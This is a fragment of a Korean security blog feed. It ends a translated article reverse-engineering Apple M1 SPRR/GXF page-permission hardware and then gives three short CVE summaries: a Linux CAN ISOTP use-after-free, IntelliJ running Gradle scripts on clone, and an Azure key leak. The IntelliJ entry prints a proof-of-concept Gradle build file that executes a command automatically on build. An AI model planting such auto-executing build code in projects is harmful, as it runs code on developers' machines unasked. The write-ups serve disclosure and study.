class="hljs-comment"># skip two instructions</span>msr ELR_GL2, x12  <span class="hljs-comment"># store the updated PC</span>isb<span class="hljs-comment"># eret restores the state from before the exception was taken</span>eret_sprr_test:<span class="hljs-comment"># ...</span><span class="hljs-comment"># test read access, x1 contains an address to a page for which we modify the SPRR register values</span>mov x10, <span class="hljs-number">0</span>    <span class="hljs-comment"># x10 is our success/failure indicator</span>ldr x1, [x1]  <span class="hljs-comment"># this instruction will fault if we can&#x27;t read from [x1]</span>mov x10, <span class="hljs-number">0x80</span> <span class="hljs-comment"># this instruction will be skipped if the previous one faulted</span></code></pre><p>모든 16개의 가능한 설정을 얻을 수 있다.</p><table><thead><tr><th>레지스터 값</th><th>페이지 권한</th></tr></thead><tbody><tr><td>0000</td><td>—</td></tr><tr><td>0001</td><td>r-x</td></tr><tr><td>0010</td><td>r–</td></tr><tr><td>0011</td><td>rw-</td></tr><tr><td>0100</td><td>—</td></tr><tr><td>0101</td><td>r-x</td></tr><tr><td>0110</td><td>r–</td></tr><tr><td>0111</td><td>—</td></tr><tr><td>1000</td><td>—</td></tr><tr><td>1001</td><td>–x</td></tr><tr><td>1010</td><td>r–</td></tr><tr><td>1011</td><td>rw-</td></tr><tr><td>1100</td><td>—</td></tr><tr><td>1101</td><td>r-x</td></tr><tr><td>1110</td><td>r–</td></tr><tr><td>1111</td><td>rw-</td></tr></tbody></table><p>여기에 이상한 점이 존재하는데, 대부분 하위 두 비트가 권한을 지정한다. 그러나 높은 비트가 권한을 변경하는 두 가지 예외가 존재한다. <code>0111</code>의 경우 <code>rw-</code>가 아닌 <code>---</code> 권한을 가지고, <code>1001</code>의 경우 <code>r-x</code>가 아닌 <code>r</code> 권한만을 가진다.</p><p>이를 인코딩하는데 두 개의 비트가 더 낭비될 필요가 없다. 이것은 처음에 쓰기, 실행 권한을 엄격하게 시행하는 유저 vs 커널 권한으로 보인다. 하지만 EL0은 다른 레지스터를 사용하는 것을 알고 있다. 그럼 얘는 뭘까?</p><h1 id="Guarded-Exception-Levels-GXF"><a href="#Guarded-Exception-Levels-GXF" class="headerlink" title="Guarded Exception Levels / GXF"></a>Guarded Exception Levels / GXF</h1><p>위에서 PPR 레지스터에 인코딩 된 약간 이상한 점을 발견했다. normal exception levels과는 다른 <a href="https://twitter.com/s1guza/status/1353749746951839748">guarded exception levels</a>에 대한 <a href="https://twitter.com/qwertyoruiopz/status/1174787964100075521">몇 가지</a> <a href="https://twitter.com/s1guza/status/1355929535699681284">언급</a>이 있다. 이것은 커스텀 명령어 <code>0x00201420</code>과 <code>0x00201400</code>(<code>genter</code>, <code>gexit</code>)을 통해 트리거 된다.</p><p>disassembler로 XNU를 가져가서, <code>otool -xv /System/Library/Kernels/kernel.release.t8101</code>을 사용하여 살펴보자.</p><pre><code class="hljs apache"><span class="hljs-attribute">fffffe00071f80f0</span>        mov     x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span><span class="hljs-attribute">fffffe00071f80f4</span>        msr     S<span class="hljs-number">3</span>_<span class="hljs-number">6</span>_C<span class="hljs-number">15</span>_C<span class="hljs-number">1</span>_<span class="hljs-number">2</span>, x<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00071f80f8</span>        adrp    x<span class="hljs-number">0</span>, <span class="hljs-number">2025</span> ; <span class="hljs-number">0</span>xfffffe<span class="hljs-number">00079</span>e<span class="hljs-number">1000</span><span class="hljs-attribute">fffffe00071f80fc</span>        add     x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">9</span>d<span class="hljs-number">8</span><span class="hljs-attribute">fffffe00071f8100</span>        msr     S<span class="hljs-number">3</span>_<span class="hljs-number">6</span>_C<span class="hljs-number">15</span>_C<span class="hljs-number">8</span>_<span class="hljs-number">2</span>, x<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00071f8104</span>        adrp    x<span class="hljs-number">0</span>, <span class="hljs-number">2025</span> ; <span class="hljs-number">0</span>xfffffe<span class="hljs-number">00079</span>e<span class="hljs-number">1000</span><span class="hljs-attribute">fffffe00071f8108</span>        add     x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">9</span>dc<span class="hljs-attribute">fffffe00071f810c</span>        msr     S<span class="hljs-number">3</span>_<span class="hljs-number">6</span>_C<span class="hljs-number">15</span>_C<span class="hljs-number">8</span>_<span class="hljs-number">1</span>, x<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00071f8110</span>        isb<span class="hljs-attribute">fffffe00071f8114</span>        mov     x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00071f8118</span>        msr     ELR_EL<span class="hljs-number">1</span>, x<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00071f811c</span>        isb<span class="hljs-attribute">fffffe00071f8120</span>        .long   <span class="hljs-number">0</span>x<span class="hljs-number">00201420</span><span class="hljs-attribute">fffffe00071f8124</span>        ret</code></pre><p>이전에 찾은 두 번째 활성화 레지스터 <code>S3_6_C15_C1_2</code>를 처음 사용한 후 알 수 없는 시스템 레지스터에 두 개의 포인터를 작성하고 <code>0x00201420</code>을 실행한다. 첫 번째 포인터는 무한 루프이지만 두 번째 포인터는 이전에 확인한 SPRR 레지스터도 사용하는 것으로 추측되는 함수를 가리킨다.</p><p>아마도 <code>S3_6_C15_C8_1</code>에 <code>0x00201420</code>이 실행되면 프로세스가 점프하는 포인터가 포함되며 <code>0x00201420</code>는 EL3에 트랩하는 <code>smc</code>이고, <code>0x00201400</code>은 EL2로 돌아가는 <code>eret</code>인 하이퍼바이저 호출 방식과 유사하다. 새로운 실행 모드에 대한 다른 페이지 테이블이 없는 것이 차이점이다. SPRR 레지스터에 알려지지 않은 2 비트가 GL2의 페이지 권한이면 어떨까?</p><p>이전과 같은 접근법을 사용하여 m1n1에서 다시 검증을 해보았다. guarded excution mode에 exception vector를 설정하고 같은 실험을 반복하자.</p><p><code>VBAR</code>라 불리는 레지스터를 호출하여 새로운 모드에서 exception vector를 설정할 수 있다. <code>genter</code> 이후 XNU가 설정하는 첫 레지스터 중 하나인 <code>S3_6_C15_C10_2</code>가 가리키는 코드를 살펴보자.</p><pre><code class="hljs"><span class="hljs-attribute">fffffe00079e0000</span>        b       <span class="hljs-number">0</span>xfffffe<span class="hljs-number">00079</span>e<span class="hljs-number">15</span>d<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00079e0004</span>        nop<span class="hljs-attribute">fffffe00079e0008</span>        nop<span class="hljs-attribute">fffffe00079e000c</span>        nop[...]<span class="hljs-attribute">fffffe00079e007c</span>        nop<span class="hljs-attribute">fffffe00079e0080</span>        b       <span class="hljs-number">0</span>xfffffe<span class="hljs-number">00079</span>e<span class="hljs-number">1000</span><span class="hljs-attribute">fffffe00079e0084</span>        nop[...]<span class="hljs-attribute">fffffe00079e00fc</span>        nop<span class="hljs-attribute">fffffe00079e0100</span>        b       <span class="hljs-number">0</span>xfffffe<span class="hljs-number">00079</span>e<span class="hljs-number">11</span>f<span class="hljs-number">0</span><span class="hljs-attribute">fffffe00079e0104</span>        nop[...]</code></pre><p><code>S3_6_C15_C10_2</code>가 <code>VBAR_GL1</code>임을 의미하는 예외 벡터 테이블로 보인다.</p><p>이것은 전체 권한 테이블을 찾는데에 동작한다. SPRR 레지스터의 값이 <code>0100</code>, <code>0110</code> 혹은 <code>1111</code>인 동안에 EL2에서 코드로 점프할 때 크래시가 난다. 이 모든 값들은 EL2에서  실행할 수 없지만 GL2에서는 가능한 페이지를 나타낸다. 이러한 결함은 몇 가지 이유로 인해 다른 주소로 지정되면 어떻게 될까? 세 가지 결함은 XNU에 무한 루프를 가리키는 시스템 레지스터를 사용한다.</p><ul><li>EL2가 GL2에서만 실행 가능한 코드로 점프하는 경우 <code>S3_6_C15_C8_2</code>로 이동(<code>GXF_ABORT_EL2</code>)</li><li>EL2에서의 다른 중단은 <code>VBAR_EL2</code>로 이동</li><li>GL2에서의 다른 중단은 <code>VBAR_GL2</code>로 이동</li></ul><p>이제 SPRR 레지스터의 모든 비트가 전체 권한 테이블로 이어짐을 알았다.</p><table><thead><tr><th>레지스터 값</th><th>EL 페이지 권한</th><th>GL 페이지 권한</th></tr></thead><tbody><tr><td>0</td><td><code>---</code></td><td><code>---</code></td></tr><tr><td>1</td><td><code>r-x</code></td><td><code>---</code></td></tr><tr><td>10</td><td><code>r--</code></td><td><code>---</code></td></tr><tr><td>11</td><td><code>rw-</code></td><td><code>---</code></td></tr><tr><td>100</td><td><code>---</code></td><td><code>r-x</code></td></tr><tr><td>101</td><td><code>r-x</code></td><td><code>r-x</code></td></tr><tr><td>110</td><td><code>r--</code></td><td><code>r-x</code></td></tr><tr><td>111</td><td><code>---</code></td><td><code>r-x</code></td></tr><tr><td>1000</td><td><code>---</code></td><td><code>r--</code></td></tr><tr><td>1001</td><td><code>--x</code></td><td><code>r--</code></td></tr><tr><td>1010</td><td><code>r--</code></td><td><code>r--</code></td></tr><tr><td>1011</td><td><code>rw-</code></td><td><code>r--</code></td></tr><tr><td>1100</td><td><code>---</code></td><td><code>rw-</code></td></tr><tr><td>1101</td><td><code>r-x</code></td><td><code>rw-</code></td></tr><tr><td>1110</td><td><code>r--</code></td><td><code>rw-</code></td></tr><tr><td>1111</td><td><code>rw-</code></td><td><code>rw-</code></td></tr></tbody></table><p>GL 권한 비트가 EL 권한 비트의 의미를 수정하는 두 가지 특별한 경우를 살펴보자.</p><ul><li><code>0111</code>은 GL에서 실행이 가능하며 EL에서 쓰기가 가능한 페이지를 만들 수 없다. 소프트웨어 오류에 대한 추가적인 하드웨어 계층 보호 기능을 제공한다. EL에서 GL로 실행 중인 코드를 변경할 수 있는 것은 전체적인 lateral level을 무의미하게 만든다.</li><li><code>1001</code>은 페이지가 GL에서만 읽을 수 있을 때 <code>r-x</code> EL 권한을 <code>--x</code> 권한으로 변경한다. EL의 코드를 숨기거나 exploit에 대한 추가적인 보호 기법으로 사용하는 것으로 추측된다.</li></ul><h2 id="Python을-통한-GL2-증명"><a href="#Python을-통한-GL2-증명" class="headerlink" title="Python을 통한 GL2 증명"></a>Python을 통한 GL2 증명</h2><p>이러한 지식을 가지고 m1n1에서 GL2를 실행하는 custom payload를 추가할 수 있다. EL1/EL0에 이미 존재하는 프레임워크를 추가할 필요가 있다. MMU를 비활성화(SPRR을 활성화한 상태에서 rwx 페이지에서 m1n1이 실행되므로)하고 페이로드로 이동한 다음 return 하기 전에 MMU를 다시 활성화하면 된다.</p><p>GL2를 탐색하여 <code>S3_6_C15_C10_3</code>이 <code>SPSR_GL2</code>일 가능성이 있음을 확인할 수 있다.</p><pre><code class="hljs angelscript">&gt;&gt;&gt; u.mrs((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">3</span>), call=p.gl_call)<span class="hljs-number">0x60000009</span>&gt;&gt;&gt; u.mrs(SPSR_EL2)<span class="hljs-number">0x60000009</span></code></pre><p>MSR finder 대신에 GL2에서 확인해보자.</p><pre><code class="hljs python">gxf_regs = find_regs(call=p.gl_call)print(<span class="hljs-string">&quot;GXF&quot;</span>)<span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> sorted(gxf_regs - all_regs):    print(<span class="hljs-string">&quot;  %s&quot;</span> % list(r))</code></pre><p>컨텍스트에서만 사용 가능한 새로운 시스템 레지스터들을 발견했다.</p><pre><code class="hljs angelscript">GXF  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">7</span>]</code></pre><p><code>3, 6, 15, 10</code>은 GL1 용도이고 <code>3, 6, 15, 11</code>은 GL2를 위한 것인지 알아내는 것은 간단하다. EL2에서 SPRR 및 GXF를 활성화한 후 EL1로 낮추어 동일한 작업을 하면 된다. 이번 작업은 새로운 레지스터만을 구한다.</p><pre><code class="hljs json">[<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">3</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">4</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">6</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">7</span>]</code></pre><p><code>3, 6, 15, 10</code> 그룹은 EL1 레지스터이다. 하지만 이것은 크게 문제가 되지는 않는다. M1은 항상 <code>HCR_EL2.E2H</code>에서 실행되며 이는 <code>_EL1</code> 레지스터가 <code>_EL2</code> 레지스터로 리다이렉션 됨을 의미한다.</p><p>이전 XNU 릴리스에서 다음과 같은 이름을 확인할 수 있다.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_ELR      ELR_GL11</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_FAR      FAR_GL11</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_ESR      ESR_GL11</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_SPSR     SPSR_GL11</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_ASPSR    ASPSR_GL11</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_VBAR     VBAR_GL11</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_TPIDR    TPIDR_GL11</span></code></pre><p>왜 이 레지스터들이 GL11 suffix를 가지고 있는지 분명하지 않지만 위에서 찾은 레지스터와 쉽게 매치할 수 있다. ASPSR에는 <code>gexit</code>가 guarded execution으로 return 해야 하는지 일반 실행으로 return 해야 하는지 결정하는 비트가 포함되어 있다.</p><h1 id="SPRR-amp-GXF-inside-XNU"><a href="#SPRR-amp-GXF-inside-XNU" class="headerlink" title="SPRR &amp; GXF inside XNU"></a>SPRR &amp; GXF inside XNU</h1><p>마지막으로 XNU가 새로운 기능을 어떻게 사용하는지 확인하자. Jonathan의 wirte up에 이미 SPRR과 GXF가 어떻게 사용되는지 있으므로 살펴볼 것이 별로 없다. SPRR은 APRR의 역할을 대체할 뿐이며 커널이 페이지 테이블에 쓸 수 없도록 하고 PPL 코드를 실행할 수 없도록 한다.</p><p>주요한 차이점은 GXF이다. APRR 레지스터를 수정하는 trampoline 함수를 주의해서 만드는 대신 GXF 엔트리 벡터를 설정한다. 그러면 페이지 테이블 권한은 자동적으로 변경되고 genter는 PPL을 직접 가리킬 수 있다.</p><p>XNU가 SPRR를 다음과 같이 초기화한다. 시작 함수는 SPRR이 EL1 SPRR 권한 레지스터를 <code>0x2020A505F020F0F0</code>로 초기화할 수 있도록 잠시 활성화한다.</p><p>그 후 초기 GL 부트스트랩 코드는 추가적인 변경을 방지하기 위해 lock 하기 전에 EL1 권한을 <code>0x2020-A506F020F0E0</code>으로 업데이트한다.</p><p>guarded excution mode의 엔트리 포인트는 커널 텍스트 영역에서 함수로 설정되며 <code>PPLTEXT</code>의 시작 부분으로 점프한다. PPL 엔트리 함수는 SPRR 권한이 올바르게 설정되었는지 확인하고 Jonathan의 write up에 작성된 대로 동작한다.</p><p>마지막으로 XNU에 사용되는 여러 가지 SPRR 페이지 권한을 살펴보자.</p><table><thead><tr><th>Index</th><th>Normal permissions</th><th>SPRR Permissions</th><th>Usage</th></tr></thead><tbody><tr><td>0</td><td>EL0</td><td>EL2</td><td>EL0</td></tr><tr><td>1</td><td><code>--x</code></td><td><code>rw-</code></td><td><code>---</code></td></tr><tr><td>3</td><td><code>---</code></td><td><code>rw-</code></td><td><code>---</code></td></tr><tr><td>5</td><td><code>rw-</code></td><td><code>rwx</code></td><td><code>rw-</code> <code>r-x</code></td></tr><tr><td>7</td><td><code>rw-</code></td><td><code>rw-</code></td><td><code>rw-</code></td></tr><tr><td>8</td><td><code>--x</code></td><td><code>r-x</code></td><td><code>---</code></td></tr><tr><td>10</td><td><code>---</code></td><td><code>r-x</code></td><td><code>---</code></td></tr><tr><td>11</td><td><code>---</code></td><td><code>r--</code></td><td><code>---</code></td></tr><tr><td>13</td><td><code>r-x</code></td><td><code>r--</code></td><td><code>r-x</code></td></tr><tr><td>15</td><td><code>r--</code></td><td><code>r--</code></td><td><code>r--</code></td></tr></tbody></table><p>GL 권한은 GL이 커널 코드를 실행하지 못하게 하고(entry 10) 유저 데이터에 접근할 수 없게(entry 7) lock 될 수 있다. </p><p>그 외에도 이전 APRR 하드웨어의 깔끔한 상위 버전으로 느껴진다. 이런 변화들은 전체적인 시스템을 오류에 덜 취약하게 만들며(레지스터들을 잠그거나, kernel→PPL 전환이 하드웨어에서 발생하며 커널과 PPL 예외 벡터는 분리되어 있다) 유연하게 만든다. APRR은 권한을 제거하는 데에만 사용되었지만 SPRR은 <code>rwx</code> 페이지가 필요하지 않을 때 권한을 다시 매핑할 수 있다.</p><h1 id="tl-dr"><a href="#tl-dr" class="headerlink" title="tl;dr"></a>tl;dr</h1><p>애플 실리콘은 공격에 대한 추가적인 보호 기법으로 함께 동작하는 두 가지 비밀스러운 기능을 가지고 있다. GXF는 GL1과 GL2라는 lateral exception level을 도입하여 다른 페이지 권한으로 EL과 상응하는 같은 페이지 테이블을 사용할 수 있다. SPRR은 EL과 GL의 페이지 엔트리에서 권한 비트를 재정의할 수 있다. 애플은 이를 통해 GL의 모든 페이지 테이블 조작 코드를 숨기고 EL이 페이지 테이블을 수정할 수 없도록 하였다. 이는 커널 모드에서 실행되는 코드로부터 페이지 테이블을 보호하여 적은 attack surface와 오버헤드를 가진 하이퍼 바이저가 효과적으로 도입된다. 이 기능들의 대부분은 파이썬과 m1n1을 사용하여 리버스 엔지니어링 할 수 있다.</p><p>리눅스를 M1으로 포팅하는 데에는 유용하지 않지만 XNU를 가상화하여 MMIO access를 trace 할 수 있다.</p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>m1</tag>
      
      <tag>apple</tag>
      
      <tag>sprr</tag>
      
      <tag>gxf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-32606: CAN ISOTP 로컬 권한 상승 취약점</title>
    <link href="/2021/05/15/fabu1ous/2021-05-15/"/>
    <url>/2021/05/15/fabu1ous/2021-05-15/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/nrb547/kernel-exploitation/blob/main/cve-2021-32606/cve-2021-32606.md">CAN ISOTP local privilege escalation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Linux Kernel 5.11 through 5.12.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p><code>net/can/isopt.c</code>의 함수 <code>iso_setsockopt()</code>에 use-after-free로 인한 권한상승 취약점이 발견되었습니다. 취약점은 CAN network subsystem 내부의 ISOTP CAN network 프로토콜에 있습니다. Race condition으로 Socket이 bound 된 이후에도 socket 옵션을 수정할 수 있고 이로 인해 use-after-free가 발생합니다.</p><p>CAN ISOTP 프로토콜은 기본 쉘이 아닌 다른 socket 옵션이 사용되면 <code>isotp_setsockopt()</code>를 호출해 socket 옵션을 적용시킵니다. <code>isotp_setsockopt()</code>는 ISOPT socket이 이미 바인드 된 상태라면 리턴, 바인드 되지 않은 상태라면 <code>isotp_bind()</code>를 호출해 바인드 작업을 거치고 user space로부터 socket 옵션 데이터를 복사합니다.</p><p><code>isotp_bind()</code>가 ISOTP socket을 바인드 할 때 해당 socket 옵션의 <code>flag</code>값이  <code>CAN_ISOTP_SF_BROADCAST</code>가 아닐 때만 CAN 수신기를 등록합니다. 만약  <code>isotp_bind()</code>가 socket을 바인드 한 직후 user space로부터 socket 옵션 데이터를 복사하기 직전에 race condition을 발생시킨다면 <code>flag</code>값이 <code>CAN_ISOTP_SF_BROADCAST</code>이면서 CAN 수신기가 등록된 socket을 생성할 수 있습니다.</p><p>이후에 함수 <code>isotp_release()</code>가 호출되어 socket을 해제할 때 <code>flag</code>값이  <code>CAN_ISOTP_SF_BROADCAST</code>이므로 등록된 CAN 수신기를 그대로 남겨놓습니다. 이를 통해 이미 해제된 socket에 접근할 수 있게 되고 use-after-free가 발생합니다. 해커는 이 취약점을 악용해 로컬 권한 상승을 할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>lpe</tag>
      
      <tag>socket</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-29263: IntelliJ, Android Studio의 외부 저장소를 통한 원격 코드 실행 취약점</title>
    <link href="/2021/05/14/l0ch/2021-05-14/"/>
    <url>/2021/05/14/l0ch/2021-05-14/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2020-337_338-intellij-idea-android-studio/">GHSL-2020-337_338: Arbitrary code execution when cloning/checking out a Gradle project - CVE-2021-29263</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>IntelliJ IDEA</li><li>Android Studio</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>IntelliJ와 Android Studio에서 악성 저장소를 가져올 때 임의 코드 실행 취약점이 발견되어 GitHub Security Lab에 세부 정보가 공개되었습니다.</p><p>Groovy를 기반으로 한 오픈소스 빌드 도구인 <a href="https://github.com/gradle/gradle">Gradle</a> 을 clone 또는 checkout할 때 IntelliJ와 Android Studio는 유저 확인단계를 생략하고 빌드 스크립트를 실행합니다. 이를 악용한 해커가 악성 저장소를 타겟에 clone 혹은 checkout 하도록 유도하면 다음과 같이 Gradle의 <code>exec</code>가 타겟의 상호작용 없이 malware dropper 기능을 수행할 수 있습니다.</p><pre><code class="hljs python">apply plugin: <span class="hljs-string">&#x27;java&#x27;</span>sourceCompatibility = <span class="hljs-number">1.8</span>targetCompatibility = <span class="hljs-number">1.8</span>void checkRequirements()&#123;    <span class="hljs-keyword">exec</span> &#123;      executable <span class="hljs-string">&#x27;touch&#x27;</span>      args <span class="hljs-string">&#x27;/tmp/pwned_from_gradle&#x27;</span>    &#125;&#125;build&#123;    checkRequirements();&#125;</code></pre><p>MS의 Visual Studio에서도 비슷한 유형의 취약점(CVE-2020-17156)이 패치된 적이 있으며 이는 오픈소스 저장소를 이용할 때 주의를 기울일 필요가 있음을 의미합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>L0ch</tag>
      
      <tag>gradle</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-27075: Microsoft Azure 권한 상승 및 정보 유출 취약점</title>
    <link href="/2021/05/13/idioth/2021-05-13/"/>
    <url>/2021/05/13/idioth/2021-05-13/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.intezer.com/blog/cloud-security/cve-2021-27075-microsoft-azure-vulnerability-allows-privilege-escalation-and-leak-of-data/">CVE-2021-27075: Microsoft Azure Vulnerability Allows Privilege Escalation and Leak of Private Data</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft Azure VM Extension</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft의 클라우드 컴퓨팅 플랫폼 Microsoft Azure에서 VM Linux 시스템의 권한 상승과 정보 유출이 가능한 취약점이 발견되었습니다.</p><p>Azure VM은 개발자와 관리자가 추가 구성요소를 설치할 수 있도록 통합 플러그인 시스템을 제공합니다. 이 기능을 통해 Azure에서 제공하는 first party 외에 third party app 또한 설치할 수 있습니다. 이러한 확장 프로그램 설치를 관리하기 위해 Microsoft Azure Guest Agent가 <code>/var/lib/waagent</code>에 설치됩니다. 이 디렉터리에는 확장 프로그램에 대한 정보가 저장되어 있어 root가 아닌 사용자는 접근할 수 없습니다.</p><p>확장 프로그램이 VM에 추가되면 설정 파일은 Azure VM Manager인 Fabric Controller에 의해 업데이트됩니다. WAAgent가 Fabric Controller에서 이 파일을 받아와서 업데이트하고 확장 프로그램을 설치하고 deploy 합니다. WAAgent는 Fabric Controller와 특정 IP 주소(168.63.129.16)를 통해 통신합니다. ExtensionConfig 파일의 엔드 포인트 Response에는 개인 키와 같은 정보가 포함되어 있으며 키는 <code>/var/lib/waagent/F54265F38F8D16C35C0E1FD3190882831A6C4384.prv</code>에 저장되고 인증서는 <code>/var/lib/waagent/F54265F38F8D16C35C0E1FD3190882831A6C4384.crt</code>에 저장됩니다. ExtensionConfig 파일에 키와 인증서가 포함되어 있지 않으므로 확장 프로그램을 deploy 할 때 Wire Server와 통신하여 Certificates endpoint를 사용하는데 이때 전송된 인증서에 대한 검증이 존재하지 않아 정보 유출이 발생합니다.</p><p>해커가 자신의 개인 키와 인증서를 만들어 그를 통해 Wire Server에 암호화된 키를 수신합니다. Transport Key를 통해 암호화된 키를 복호화하여 ExtensionConfig의 <code>protectedSettings</code>를 읽어올 수 있습니다. 또한 Azure Instance Metadata Service인 169.254.169.254와의 통신을 통해 168.63.129.16에 필요한 root 권한 없이 Wire Server와 통신하여 정보를 유출할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>microsoft</tag>
      
      <tag>idioth</tag>
      
      <tag>azure</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
